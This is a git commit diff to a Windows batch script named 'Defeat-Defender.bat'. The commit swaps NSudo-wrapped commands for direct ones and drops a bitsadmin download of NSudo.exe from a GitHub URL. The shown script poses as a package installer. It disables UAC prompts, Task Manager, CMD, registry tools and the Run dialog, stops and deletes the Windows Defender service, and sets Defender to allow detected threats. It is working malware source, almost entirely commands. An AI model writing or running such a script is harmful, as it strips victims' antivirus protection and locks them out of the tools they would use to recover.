1dc0bbc96614bb4649385107cd0600e87f3c4747
KrowofAgony <krowofagony@yahoo.com>
2024-09-17 12:05:28 -0400

    Update Defeat-Defender.bat
    Fixed the script to DIRECTLY implement the changes. NSUDO is NOT available to perform the directed script commands. Thus, the script actions are directly executed instead.

--- Defeat-Defender.bat
+++ Defeat-Defender.bat
@@ -26,33 +26,29 @@ echo msgbox "Please Wait While we install necessary packages for You!.Window wil
 wscript %tmp%\tmp.vbs
 del %tmp%\tmp.vbs
 
-echo  Installing Necessary Packages.....Please Wait.....
+echo  Installing Necessary Packages.....Please Wait..... NOTE: NSudo is NOT available; adding registry keys, and deleting windefend directly instead.
 
 color 0a
 
 cd  %temp%
 
-bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
-
 set pop=%systemroot%
 
-NSudo -U:T -ShowWindowMode:Hide icacls "%pop%\System32\smartscreen.exe" /inheritance:r /remove *S-1-5-32-544 *S-1-5-11 *S-1-5-32-545 *S-1-5-18
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
 
-NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"  /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
-
-NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
+reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration"  /v "Notification_Suppress" /t REG_DWORD /d "1" /f
  
-NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d "1" /f
 
-NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d "1" /f
 
-NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d "1" /f
 
-NSudo -U:T -ShowWindowMode:Hide reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "NoRun" /t REG_DWORD /d "1" /f
 
-NSudo -U:T -ShowWindowMode:Hide  sc stop  windefend  
+sc stop windefend  
 
-NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  
+sc delete windefend  
 
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
 
@@ -65,6 +61,7 @@ powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled
 powershell.exe -command "Set-MpPreference -PUAProtection disable"
 
 powershell.exe -command "Set-MpPreference -HighThreatDefaultAction 6 -Force"
+
 powershell.exe -command "Set-MpPreference -ModerateThreatDefaultAction 6"
       
 powershell.exe -command "Set-MpPreference -LowThreatDefaultAction 6"
